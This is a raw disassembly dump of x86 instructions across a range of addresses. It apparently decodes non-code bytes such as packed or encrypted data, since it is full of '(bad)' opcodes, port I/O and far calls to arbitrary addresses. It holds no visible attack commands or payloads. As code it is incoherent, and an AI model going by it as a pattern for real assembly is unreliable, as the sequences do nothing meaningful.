  42ee6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee6b:	push   ds
  42ee6c:	fwait
  42ee6d:	stc    
  42ee6e:	gs mov al,0x60
  42ee71:	mov    ds:0xba64e64f,al
  42ee76:	aas    
  42ee77:	test   cl,ch
  42ee79:	or     bh,BYTE PTR [ebx]
  42ee7b:	xchg   ecx,eax
  42ee7c:	rol    ebx,1
  42ee7e:	sbb    al,0x58
  42ee80:	jg     0x42ee86
  42ee82:	loop   0x42eea2
  42ee84:	lahf   
  42ee85:	shr    BYTE PTR [ebx-0xdd6bbfd],1
  42ee8b:	push   ss
  42ee8c:	push   edx
  42ee8d:	out    0xd4,al
  42ee8f:	in     eax,0x17
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	enter  0xc20f,0xd4
  42ef04:	jl     0x42eefd
  42ef06:	add    DWORD PTR [eax],eax
  42ef08:	add    eax,0xdc000001
  42ef0d:	call   0xdfa8f9cf
  42ef12:	xor    eax,0xad514548
  42ef17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef18:	mov    WORD PTR [esi+0x1e49daee],fs
  42ef1e:	fisttp WORD PTR [ebx+0x5c]
  42ef21:	fmul   QWORD PTR [ecx+0x79]
  42ef24:	fadd   DWORD PTR ds:0x301d24bb
  42ef2a:	mov    ebp,0x377e2319
  42ef2f:	mov    ebp,0xc0683155
  42ef34:	fwait
  42ef35:	imul   edi,DWORD PTR [ebx+esi*1-0x17],0x7a8c9b34
  42ef3d:	or     DWORD PTR [esi-0x7d],edi
  42ef40:	std    
  42ef41:	jge    0x42ef16
  42ef43:	arpl   WORD PTR [eax+0x481062cd],cx
  42ef49:	(bad)  
  42ef4a:	cs xor eax,ebp
  42ef4d:	add    al,0xe0
  42ef4f:	ret    
  42ef50:	push   esp
  42ef51:	sbb    ebx,edx
  42ef53:	mov    eax,0xd6d898f7
  42ef58:	inc    esp
  42ef59:	out    0x42,al
  42ef5b:	add    esp,esi
  42ef5d:	jne    0x42eef1
  42ef5f:	pop    ecx
  42ef60:	cmp    ecx,DWORD PTR [esi]
  42ef62:	mov    cl,0x42
  42ef64:	in     eax,0xc5
  42ef66:	inc    ebp
  42ef67:	fs jb  0x42ef73
  42ef6a:	xor    DWORD PTR [ebx+0x71],0xffffff82
  42ef6e:	mov    ecx,0x2bda37ef
  42ef73:	adc    BYTE PTR ds:0x610d7eea,bl
  42ef79:	push   esp
  42ef7a:	(bad)  
  42ef7b:	repnz pop esi
  42ef7d:	jle    0x42efd3
  42ef7f:	(bad)  
  42ef81:	mov    cl,dh
  42ef83:	test   eax,0xe47483a
  42ef88:	and    eax,0xa011b62a
  42ef8d:	xor    al,0xf3
  42ef8f:	das    
  42ef90:	and    dh,dl
  42ef92:	test   BYTE PTR [eax],ah
  42ef94:	test   DWORD PTR [ebp-0x4d58f903],0x44b9c517
  42ef9e:	scas   eax,DWORD PTR es:[edi]
  42ef9f:	jecxz  0x42ef6e
  42efa1:	fisubr WORD PTR [esi-0x62]
  42efa4:	mov    eax,ds:0xa28995c4
  42efa9:	jle    0x42ef75
  42efab:	inc    BYTE PTR [ebx+0x25b783cf]
  42efb1:	push   esp
  42efb2:	fst    QWORD PTR [ebx+0x3d]
  42efb5:	and    DWORD PTR [esi],eax
  42efb7:	sbb    dl,BYTE PTR [ebx-0x222cea74]
  42efbd:	xor    eax,DWORD PTR [ebx+0x3552f863]
  42efc3:	dec    ebx
  42efc4:	jno    0x42efa1
  42efc6:	add    eax,0x9ccdae49
  42efcb:	inc    BYTE PTR [edi-0x1331a512]
  42efd1:	inc    edx
  42efd2:	sahf   
  42efd3:	push   ds
  42efd4:	cmp    edx,DWORD PTR [ecx]
  42efd6:	add    dh,BYTE PTR [ecx+0x2e571edb]
  42efdc:	adc    eax,0x45759409
  42efe1:	outs   dx,DWORD PTR ds:[esi]
  42efe2:	into   
  42efe3:	sti    
  42efe4:	js     0x42eff1
  42efe6:	leave  
  42efe7:	sbb    al,0x25
  42efe9:	add    bl,dl
  42efeb:	add    eax,0x13001a97
  42eff0:	ret    0x685b
  42eff3:	inc    ebx
  42eff4:	jecxz  0x42f064
  42eff6:	call   0xa2f6:0x7f6cf26f
  42effd:	jecxz  0x42efc7
  42efff:	add    ebx,DWORD PTR [eax+0x58207079]
  42f005:	mov    dh,dl
  42f007:	fsubr  st(4),st
  42f009:	jl     0x42f049
  42f00b:	mov    edx,0xb7ff21e6
  42f010:	add    BYTE PTR gs:[eax],al
	...
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	mov    eax,0x81e18e58
  42f085:	clc    
  42f086:	add    DWORD PTR [eax],eax
  42f088:	add    eax,0x44000001
  42f08d:	mov    ah,0x4a
  42f08f:	xor    DWORD PTR [ebx+ebx*1+0xf],edi
  42f093:	data16 int3 
  42f095:	mov    ebp,0x73aa83d7
  42f09a:	popa   
  42f09b:	mov    WORD PTR [esi-0x7e2ae4ef],ss
  42f0a1:	mov    bh,0x33
  42f0a3:	in     eax,dx
  42f0a4:	xchg   edi,eax
  42f0a5:	jns    0x42f0ca
  42f0a7:	jno    0x42f0b9
  42f0a9:	leave  
  42f0aa:	push   esi
  42f0ab:	(bad)  [ecx+0x71]
  42f0ae:	shl    BYTE PTR [ecx-0x211f5e91],1
  42f0b4:	xchg   edx,eax
  42f0b5:	mov    eax,0x88fbed9b
  42f0ba:	and    bh,BYTE PTR [edi-0x45e8ab2a]
  42f0c0:	mov    eax,0x82240804
  42f0c5:	cmp    al,0xe4
  42f0c7:	popa   
  42f0c8:	cmp    eax,0x23969b70
  42f0cd:	ss aaa 
  42f0cf:	xor    dl,cl
  42f0d1:	retf   
  42f0d2:	bound  ebx,QWORD PTR [eax+0x8]
  42f0d5:	xor    al,0xd8
  42f0d7:	pop    ss
  42f0d8:	ja     0x42f09f
  42f0da:	xor    al,0x18
  42f0dc:	aad    0xb6
  42f0de:	fbld   TBYTE PTR [ebp+0x3c]
  42f0e1:	call   DWORD PTR ss:[eax]
  42f0e4:	adc    edx,DWORD PTR [ebx+0x68]
  42f0e7:	aad    0x35
  42f0e9:	shr    DWORD PTR ds:0x23d7edf7,1
  42f0ef:	aam    0xef
  42f0f1:	xchg   BYTE PTR [eax-0x24],al
  42f0f4:	inc    edx
  42f0f5:	mov    ds:0x2623e3ff,al
  42f0fa:	sbb    BYTE PTR [ebx+0xd047cda],al
  42f100:	jmp    0x42f103
  42f102:	mov    eax,ds:0x33b976b7
  42f107:	aam    0x18
  42f109:	pop    ecx
  42f10a:	push   ebx
  42f10b:	daa    
  42f10c:	fidiv  WORD PTR [esi-0x25037f27]
  42f112:	add    eax,0xcf7af062
  42f117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f118:	repz mov edx,0xb976f2c9
  42f11e:	jge    0x42f191
  42f120:	cmp    BYTE PTR [ebp+esi*8-0x4458becc],0xc1
  42f128:	call   0xda3c:0x7716afcf
  42f12f:	lahf   
  42f130:	pop    edi
  42f131:	imul   esi,eax,0x25
  42f134:	xchg   ecx,eax
  42f135:	fisubr WORD PTR [edi+0x629167ab]
  42f13b:	mov    ds:0xd58813e5,eax
  42f140:	push   esi
  42f141:	sub    al,0x8
  42f143:	jmp    0xacd4f641
  42f148:	dec    ebx
  42f149:	call   0x3c0d2f9c
  42f14e:	cmp    BYTE PTR [edx+0x7d],al
  42f151:	hlt    
  42f152:	inc    esp
  42f153:	xchg   BYTE PTR [ebx],dh
  42f155:	lock pushf 
  42f157:	fwait
  42f158:	shr    edx,0x42
  42f15b:	les    eax,FWORD PTR [edi-0x46]
  42f15e:	test   edi,ebx
  42f160:	adc    eax,DWORD PTR gs:[edx+eax*4+0x63]
  42f165:	frstor [edx]
  42f167:	in     eax,0xff
  42f169:	inc    edi
  42f16a:	pop    ss
  42f16b:	add    ah,bh
  42f16d:	mov    ebx,0xe1777b32
  42f172:	sbb    ebx,ebp
  42f174:	mov    ah,0x80
  42f176:	inc    esi
  42f177:	sub    cl,BYTE PTR [esi]
  42f179:	or     BYTE PTR gs:[edi-0x7ada0a62],dl
  42f180:	pop    es
  42f181:	idiv   DWORD PTR [esi+edi*8-0x2f]
  42f185:	ror    cl,cl
  42f187:	jb     0x42f180
  42f189:	(bad)  
  42f18a:	shr    DWORD PTR [ebp-0x1b],1
  42f18d:	xchg   ebx,eax
  42f18e:	push   ds
  42f18f:	les    edi,FWORD PTR [edi]
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	push   0xffffffb7
  42f202:	(bad)  
  42f203:	jmp    0x105:0x1f986
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	cmp    DWORD PTR [esi+0x6d],0xffffff89
  42f210:	mov    al,0xc8
  42f212:	ret    0x44ab
  42f215:	pop    esp
  42f216:	mov    ecx,0x9a242017
  42f21b:	test   DWORD PTR [edi],eax
  42f21d:	or     ebp,DWORD PTR [edi-0x85fd372]
  42f223:	das    
  42f224:	add    al,BYTE PTR [esi+ecx*4+0x10378ab1]
  42f22b:	and    al,0xb2
  42f22d:	jg     0x42f224
  42f22f:	mov    ebp,edi
  42f231:	and    DWORD PTR [edi],ecx
  42f233:	adc    dh,BYTE PTR [ebp-0x6c]
  42f236:	mov    ds:0x73266c98,al
  42f23b:	div    bh
  42f23d:	sbb    edx,ecx
  42f23f:	push   esi
  42f240:	lds    edi,FWORD PTR [edi+0x6b]
  42f243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f244:	dec    ebp
  42f245:	popa   
  42f246:	and    BYTE PTR [edi-0x189a6b2b],dh
  42f24c:	push   0xffffff93
  42f24e:	dec    eax
  42f24f:	push   0x403d6ab5
  42f254:	shl    DWORD PTR [edi-0xf],cl
  42f257:	js     0x42f1ec
  42f259:	clc    
  42f25a:	ja     0x42f1df
  42f25c:	add    ch,BYTE PTR [esi]
  42f25e:	pop    esp
  42f25f:	mov    bl,BYTE PTR [edi+0x5e]
  42f262:	ins    DWORD PTR es:[edi],dx
  42f263:	push   eax
  42f264:	mov    al,0xd2
  42f266:	gs loop 0x42f2db
  42f269:	xor    DWORD PTR es:0x5ffb4b7c,edi
  42f270:	(bad)  
  42f271:	adc    bl,cl
  42f273:	call   0x3ef2bddc
  42f278:	sub    DWORD PTR [esi+ebx*2+0x26],ecx
  42f27c:	dec    edi
  42f27d:	push   ds
  42f27e:	(bad)  
  42f27f:	retf   
  42f280:	stc    
  42f281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f282:	cmp    ebx,DWORD PTR [ebx+edi*4+0x28]
  42f286:	cdq    
  42f287:	fcmovnu st,st(5)
  42f289:	mov    bl,0x83
  42f28b:	in     eax,0xa0
  42f28d:	mov    ds,WORD PTR [edx+0x780cdbea]
  42f293:	gs dec esp
  42f295:	iret   
  42f296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f297:	cmp    DWORD PTR [ebp+0x3581b36c],0x1436bb83
  42f2a1:	mov    edx,0xe4538c2e
  42f2a6:	rol    BYTE PTR [ecx],cl
  42f2a8:	loopne 0x42f2b6
  42f2aa:	and    al,BYTE PTR [eax-0x3c]
  42f2ad:	xchg   esp,eax
  42f2ae:	call   0x222b3a26
  42f2b3:	jns    0x42f266
  42f2b5:	retf   0x4ed6
  42f2b8:	nop
  42f2b9:	adc    eax,DWORD PTR [edx+0x5d]
  42f2bc:	stos   DWORD PTR es:[edi],eax
  42f2bd:	push   ebp
  42f2be:	daa    
  42f2bf:	sar    BYTE PTR [eax+0x14],cl
  42f2c2:	jl     0x42f308
  42f2c4:	mov    ds:0x296b2d13,eax
  42f2c9:	es stos BYTE PTR es:[edi],al
  42f2cb:	adc    edi,DWORD PTR ds:0xf7fc850
  42f2d1:	adc    dh,BYTE PTR [esi]
  42f2d3:	sbb    bh,BYTE PTR [eax]
  42f2d5:	adc    BYTE PTR [esi+0x50649b67],dh
  42f2db:	(bad)  
  42f2dd:	cwde   
  42f2de:	(bad)  
  42f2df:	scas   eax,DWORD PTR es:[edi]
  42f2e0:	sbb    al,0x29
  42f2e2:	fist   WORD PTR [ebx+0x4a]
  42f2e5:	mov    DWORD PTR [ecx-0x575b6e39],ecx
  42f2eb:	and    al,0x7a
  42f2ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2ee:	push   edx
  42f2ef:	nop
  42f2f0:	sar    BYTE PTR [edx],1
  42f2f2:	xchg   edx,eax
  42f2f3:	push   edx
  42f2f4:	(bad)
  42f2f8:	les    ebx,FWORD PTR [edx-0x5b1bafc2]
  42f2fe:	test   eax,0x3fd63093
  42f303:	mov    dl,0x7e
  42f305:	sub    DWORD PTR [edx-0x5b],eax
  42f308:	loop   0x42f357
  42f30a:	dec    ecx
  42f30b:	hlt    
  42f30c:	inc    edx
  42f30d:	jle    0x42f32e
  42f30f:	sbb    ebx,esp
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	xchg   dl,bh
  42f382:	sub    al,0x78
  42f384:	mov    edi,edx
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0xcd000001
  42f38d:	test   al,0x16
  42f38f:	sti    
  42f390:	inc    edx
  42f391:	push   es
  42f392:	jmp    0x42f3e0
  42f394:	add    dh,BYTE PTR [edx-0x6e]
  42f397:	or     bh,BYTE PTR [eax-0x3661c1de]
  42f39d:	in     eax,0x2e
  42f39f:	in     eax,dx
  42f3a0:	pop    edi
  42f3a1:	call   0x3ea6:0x2aaa85c4
  42f3a8:	pushf  
  42f3a9:	(bad)  [ecx-0x4a27905f]
  42f3af:	lahf   
  42f3b0:	inc    ecx
  42f3b1:	outs   dx,BYTE PTR ds:[esi]
  42f3b2:	or     eax,0x984a31b3
  42f3b7:	add    al,0xd9
  42f3b9:	mov    al,ds:0x44ceeef
  42f3be:	adc    ah,BYTE PTR [esi-0x3e]
  42f3c1:	test   ebx,0xdcbee8c7
  42f3c7:	idiv   DWORD PTR [ebx-0xf784927]
  42f3cd:	push   ss
  42f3ce:	sbb    ecx,DWORD PTR [ebx]
  42f3d0:	int3   
  42f3d1:	sbb    bh,BYTE PTR ds:0x9952e545
  42f3d7:	test   ax,0x2c9c
  42f3db:	sbb    BYTE PTR [edi+0x15],cl
  42f3de:	xlat   BYTE PTR ds:[ebx]
  42f3df:	ucomiss xmm3,DWORD PTR [ecx+0x67]
  42f3e3:	cmp    eax,0x8b44711c
  42f3e8:	xor    DWORD PTR [edi],esi
  42f3ea:	lahf   
  42f3eb:	xor    dl,ch
  42f3ed:	xor    ch,bh
  42f3ef:	fs pop ebp
  42f3f1:	adc    BYTE PTR [edx+0x72ae1259],0xfe
  42f3f8:	test   BYTE PTR [ebx+0x26],bh
  42f3fb:	imul   ecx,DWORD PTR [edi],0x20
  42f3fe:	mov    ecx,ebp
  42f400:	jbe    0x42f3a9
  42f402:	out    0xe2,al
  42f404:	loop   0x42f426
  42f406:	stos   DWORD PTR es:[edi],eax
  42f407:	mov    ebx,0x739a6685
  42f40c:	clc    
  42f40d:	in     al,0xfb
  42f40f:	mov    DWORD PTR [esi+esi*1+0x6c2db814],0xe64b6a90
  42f41a:	and    BYTE PTR [ecx],al
  42f41c:	or     DWORD PTR [esi],ebx
  42f41e:	cmp    eax,0x712c6a57
  42f423:	or     ebp,DWORD PTR [ebx*8+0x212bfdea]
  42f42a:	std    
  42f42b:	call   0x3643:0xea903f9
  42f432:	sub    edi,DWORD PTR [ebx+0x5618d8ac]
  42f438:	adc    BYTE PTR [eax+0x74b30f8],dl
  42f43e:	nop
  42f43f:	aaa    
  42f440:	lea    edi,[edx-0x5a0aae67]
  42f446:	clc    
  42f447:	and    DWORD PTR [ecx+0x21],ecx
  42f44a:	sahf   
  42f44b:	pop    ds
  42f44c:	mov    ebp,0xa5fa6709
  42f451:	jno    0x42f4a0
  42f453:	dec    eax
  42f454:	outs   dx,DWORD PTR ds:[esi]
  42f455:	test   eax,0x229e747e
  42f45a:	pop    edx
  42f45b:	popa   
  42f45c:	(bad)  
  42f45d:	fs mov gs:0xaf64a618,eax
  42f464:	mov    eax,ds:0xef73bd28
  42f469:	add    ebp,ecx
  42f46b:	xchg   DWORD PTR [ebx+ecx*2+0x57272ca8],esi
  42f472:	adc    al,0x1c
  42f474:	leave  
  42f475:	(bad)  
  42f477:	jae    0x42f495
  42f479:	or     eax,edx
  42f47b:	dec    edi
  42f47c:	mov    edi,0x19762069
  42f481:	(bad)  
  42f482:	xchg   esi,eax
  42f483:	int    0x9e
  42f485:	retf   
  42f486:	and    BYTE PTR [ebx+0x7c],bl
  42f489:	sbb    DWORD PTR [edx],edx
  42f48b:	test   DWORD PTR [ebp-0x11],ecx
  42f48e:	out    0xda,eax
  42f490:	clc    
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	sbb    eax,DWORD PTR [esi-0x46f99c6]
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0x28000001
  42f50d:	test   al,0x19
  42f50f:	in     eax,dx
  42f510:	dec    ebp
  42f511:	inc    esp
  42f512:	jg     0x42f517
  42f514:	test   DWORD PTR [ecx-0x6e8774e4],0x238a4d68
  42f51e:	frstor [ecx]
  42f520:	push   ds
  42f521:	pop    ebx
  42f522:	(bad)  
  42f523:	sub    al,0xa8
  42f525:	outs   dx,DWORD PTR ds:[esi]
  42f526:	imul   ebp,DWORD PTR [edx+ecx*1+0x7f],0x57a07304
  42f52e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f52f:	add    al,0x0
  42f531:	xor    edi,DWORD PTR [ebp+0x59d7b87b]
  42f537:	fwait
  42f538:	scas   eax,DWORD PTR es:[edi]
  42f539:	inc    ecx
  42f53a:	mov    al,0x3
  42f53c:	(bad)  
  42f53d:	in     eax,0x5a
  42f53f:	add    eax,0xd3ea823b
  42f544:	inc    edi
  42f545:	pop    ds
  42f546:	push   cs
  42f547:	pop    ds
  42f548:	dec    ecx
  42f549:	mov    esi,0xc34e381
  42f54e:	sbb    DWORD PTR [ebx+edx*1-0x5738db3e],0xb7bc70f7
  42f559:	fwait
  42f55a:	or     dl,BYTE PTR [esi+0x16277d4f]
  42f560:	les    esp,FWORD PTR [ebx]
  42f562:	call   0x50ad8f3e
  42f567:	pop    edi
  42f568:	ud2    
  42f56a:	pushf  
  42f56b:	test   al,0xb6
  42f56d:	into   
  42f56e:	pusha  
  42f56f:	push   es
  42f570:	in     eax,0x77
  42f572:	imul   DWORD PTR [edi+0x25]
  42f575:	mov    ebp,0xdf6f14e6
  42f57a:	mov    eax,0xaf8ea360
  42f57f:	push   edx
  42f580:	sbb    edx,DWORD PTR [esi]
  42f582:	xor    eax,esi
  42f584:	les    eax,FWORD PTR [ebx]
  42f586:	jg     0x42f587
  42f588:	sbb    DWORD PTR ds:0xde45795f,ecx
  42f58e:	jl     0x42f5a2
  42f590:	jg     0x42f592
  42f592:	enter  0xc6,0xd3
  42f596:	clc    
  42f597:	lods   al,BYTE PTR ds:[esi]
  42f598:	imul   edi,DWORD PTR [ebp+0x43860b71],0x8f1bf9e5
  42f5a2:	adc    esp,ebx
  42f5a4:	loope  0x42f53f
  42f5a6:	xor    esi,ecx
  42f5a8:	xlat   BYTE PTR ds:[ebx]
  42f5a9:	push   esp
  42f5aa:	arpl   sp,dx
  42f5ac:	loope  0x42f596
  42f5ae:	push   ecx
  42f5af:	arpl   di,sp
  42f5b1:	jbe    0x42f58b
  42f5b3:	je     0x42f5b9
  42f5b5:	mov    ds:0x2852acb2,al
  42f5ba:	and    BYTE PTR [edi+0x6ea480ee],dl
  42f5c0:	sbb    BYTE PTR [eax-0x7f],ah
  42f5c3:	imul   DWORD PTR [eax+edi*4]
  42f5c6:	and    eax,0x102d8e71
  42f5cb:	nop
  42f5cc:	sub    BYTE PTR ss:[ebx],cl
  42f5cf:	imul   edx,DWORD PTR ds:0xbed8f499,0x176b13e4
  42f5d9:	mov    ds:0x8887acca,eax
  42f5de:	xchg   ebp,eax
  42f5df:	pop    ds
  42f5e0:	lods   al,BYTE PTR ds:[esi]
  42f5e1:	add    eax,0x41da89c5
  42f5e6:	loopne 0x42f628
  42f5e8:	retf   0xc4f7
  42f5eb:	mov    eax,ds:0x9a893850
  42f5f0:	mov    cs,edi
  42f5f2:	retf   0xa3b8
  42f5f5:	repz adc al,0x78
  42f5f8:	mov    ebx,0x309948cb
  42f5fd:	std    
  42f5fe:	fidivr WORD PTR [edi]
  42f600:	iret   
  42f601:	out    0xe0,al
  42f603:	jge    0x42f5d4
  42f605:	and    ecx,DWORD PTR [ebp+0x7a]
  42f608:	iret   
  42f609:	in     eax,dx
  42f60a:	pop    ebx
  42f60b:	inc    ebx
  42f60c:	test   al,0xdb
  42f60e:	addr16 and eax,0x60
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	sbb    DWORD PTR [esi-0x69],0x1fc9539
  42f687:	add    BYTE PTR ds:0xa7000001,al
  42f68d:	test   eax,0x5dddc6dc
  42f692:	mov    ecx,0xbc99ab5c
  42f697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f698:	xchg   ecx,eax
  42f699:	and    eax,0xa4895c1f
  42f69e:	inc    ecx
  42f69f:	add    ebp,DWORD PTR [edx]
  42f6a1:	mov    edi,0x188ef25
  42f6a6:	push   ss
  42f6a7:	dec    esp
  42f6a8:	aad    0x79
  42f6aa:	sub    ch,BYTE PTR [ecx]
  42f6ac:	jp     0x42f712
  42f6ae:	add    eax,0x2242040
  42f6b3:	adc    BYTE PTR es:[edi+0xf459cd7],dl
  42f6ba:	inc    eax
  42f6bb:	ret    0xd84f
  42f6be:	push   edx
  42f6bf:	jge    0x42f6b7
  42f6c1:	and    esi,DWORD PTR [esp+eax*2]
  42f6c4:	push   edx
  42f6c5:	fwait
  42f6c6:	jo     0x42f704
  42f6c8:	jbe    0x42f6c6
  42f6ca:	and    bl,BYTE PTR [edi+edx*1+0x3c2dd377]
  42f6d1:	jle    0x42f6f8
  42f6d3:	push   0x69c4fd59
  42f6d8:	pop    ebp
  42f6d9:	push   ebp
  42f6da:	pop    es
  42f6db:	cmp    al,0x51
  42f6dd:	js     0x42f69a
  42f6df:	enter  0xbc45,0x19
  42f6e3:	sar    DWORD PTR [edi-0x26fa241c],0xac
  42f6ea:	loop   0x42f6af
  42f6ec:	test   eax,0xae321b6f
  42f6f1:	call   0xe5e1:0xdb23404c
  42f6f8:	aaa    
  42f6f9:	out    dx,al
  42f6fa:	or     BYTE PTR [ebp-0x7de8ce33],dh
  42f700:	in     eax,0x76
  42f702:	int3   
  42f703:	loop   0x42f69d
  42f705:	push   ds
  42f706:	mov    edx,0x431d428d
  42f70b:	xor    esi,DWORD PTR [esi-0x1a642c65]
  42f711:	sbb    bh,bh
  42f713:	jl     0x42f72b
  42f715:	and    DWORD PTR [edi-0x4d2de057],edx
  42f71b:	rcr    BYTE PTR [eax+0x70],1
  42f71e:	pop    fs
  42f720:	fcmovnbe st,st(3)
  42f722:	repz and esi,edi
  42f725:	adc    DWORD PTR [ecx-0x14],ecx
  42f728:	mov    dl,al
  42f72a:	or     BYTE PTR [ebx],al
  42f72c:	xchg   DWORD PTR [edx+0x1e],ebp
  42f72f:	bound  esi,QWORD PTR [eax+0x56]
  42f732:	scas   al,BYTE PTR es:[edi]
  42f733:	sub    al,0x4a
  42f735:	sbb    BYTE PTR [esi-0x3daaf7f],dh
  42f73b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f73c:	mov    bh,0xd3
  42f73e:	sbb    eax,0xf2496049
  42f743:	jmp    0xe12e0f05
  42f748:	add    al,0x79
  42f74a:	das    
  42f74b:	sub    edx,DWORD PTR [ebp+edi*2+0x42f70d31]
  42f752:	ret    0xc7aa
  42f755:	jno    0x42f6ed
  42f757:	adc    DWORD PTR [ecx+0x6a],esp
  42f75a:	jg     0x42f7b4
  42f75c:	sbb    bl,cl
  42f75e:	dec    ebx
  42f75f:	add    edi,DWORD PTR [eax+edx*4-0x71]
  42f763:	mov    cl,0xea
  42f765:	or     esi,ecx
  42f767:	cld    
  42f768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f769:	and    DWORD PTR [ecx-0x3e22d81e],0x2a259c7
  42f773:	or     edx,esi
  42f775:	add    al,BYTE PTR [esi+esi*1]
  42f778:	push   esp
  42f779:	lahf   
  42f77a:	inc    esp
  42f77b:	sub    BYTE PTR [ebx-0x2e],cl
  42f77e:	inc    esp
  42f77f:	push   es
  42f780:	call   0x2d7:0x16badb4c
  42f787:	pop    edi
  42f788:	push   0xfffffff7
  42f78a:	loopne 0x42f7fb
  42f78c:	jmp    FWORD PTR [edx+0x32c968]
	...
  42f7f2:	add    BYTE PTR [eax],al
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x611c2949
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [eax+0x22e3dac3],ch
  42f811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f812:	mov    cl,0x8e
  42f814:	in     eax,dx
  42f815:	lods   al,BYTE PTR ds:[esi]
  42f816:	mov    ch,0xd5
  42f818:	fs retf 0x2625
  42f81c:	ret    
  42f81d:	inc    esp
  42f81e:	xor    ah,BYTE PTR [ebx+0x472420e4]
  42f824:	cwde   
  42f825:	jecxz  0x42f81f
  42f827:	adc    edi,ebp
  42f829:	jl     0x42f7ab
  42f82b:	jl     0x42f870
  42f82d:	jmp    0xcd7ff191
  42f832:	mov    ds:0xa4bc160,al
  42f837:	sbb    DWORD PTR fs:[edx-0x4c],0xffffff99
  42f83c:	push   0x6224669b
  42f841:	retf   0x43ca
  42f844:	or     eax,0xbf8787be
  42f849:	mov    al,BYTE PTR [esi]
  42f84b:	sahf   
  42f84c:	jp     0x42f829
  42f84e:	pop    ebx
  42f84f:	int    0x78
  42f851:	xor    bl,BYTE PTR [eax+0x7a]
  42f854:	fbstp  TBYTE PTR [eax+0xaf2c10e]
  42f85a:	pushf  
  42f85b:	mov    ecx,0x41e0f6c
  42f860:	arpl   WORD PTR [ebp-0x7c272a4c],bx
  42f866:	sahf   
  42f867:	cmp    DWORD PTR [ecx+ebp*1+0x56b97bf3],esp
  42f86e:	sub    ebx,DWORD PTR [eax+0x3b]
  42f871:	fadd   st(4),st
  42f873:	ror    al,0x33
  42f876:	dec    ebp
  42f877:	mov    ebx,ebx
  42f879:	add    edi,DWORD PTR [edx-0x51]
  42f87c:	(bad)  
  42f87d:	das    
  42f87e:	test   BYTE PTR [eax-0x41],0xa4
  42f882:	rcr    BYTE PTR [edi-0x17ad7032],0x1f
  42f889:	pop    edx
  42f88a:	jg     0x42f873
  42f88c:	sub    eax,0x740a1970
  42f891:	mov    esp,0x3e2507b9
  42f896:	clc    
  42f897:	(bad)  
  42f898:	(bad)  
  42f89a:	std    
  42f89b:	sbb    BYTE PTR [eax+0x13f0d9a3],cl
  42f8a1:	shl    DWORD PTR [esi-0x69],0x30
  42f8a5:	jge    0x42f84b
  42f8a7:	out    dx,eax
  42f8a8:	pop    edi
  42f8a9:	adc    edx,ebp
  42f8ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8ac:	mov    al,0xe7
  42f8ae:	call   0xbf9:0xdb5781d3
  42f8b5:	add    esi,0xffffff9c
  42f8b8:	mov    WORD PTR [edi+0x76],gs
  42f8bb:	dec    edx
  42f8bc:	add    eax,0x775ac88d
  42f8c1:	jge    0x42f8bd
  42f8c3:	pop    es
  42f8c4:	pop    edx
  42f8c5:	dec    ebp
  42f8c6:	in     al,0x7
  42f8c8:	out    0x14,eax
  42f8ca:	sti    
  42f8cb:	xchg   esi,eax
  42f8cc:	popf   
  42f8cd:	mov    bh,0x2d
  42f8cf:	mov    eax,ds:0xc9e75fe0
  42f8d4:	iret   
  42f8d5:	inc    edx
  42f8d6:	bound  ecx,QWORD PTR [ebp-0xb]
  42f8d9:	dec    DWORD PTR [edx+0x34]
  42f8dc:	lock adc esi,DWORD PTR [esp+edi*4-0x59]
  42f8e1:	push   ds
  42f8e2:	mov    ch,0x8a
  42f8e4:	xor    eax,0xe66c5d4c
  42f8e9:	pop    es
  42f8ea:	xor    DWORD PTR [ebp-0x30fb5650],ebx
  42f8f0:	in     al,dx
  42f8f1:	jae    0x42f8fd
  42f8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8f4:	loopne 0x42f911
  42f8f6:	dec    edx
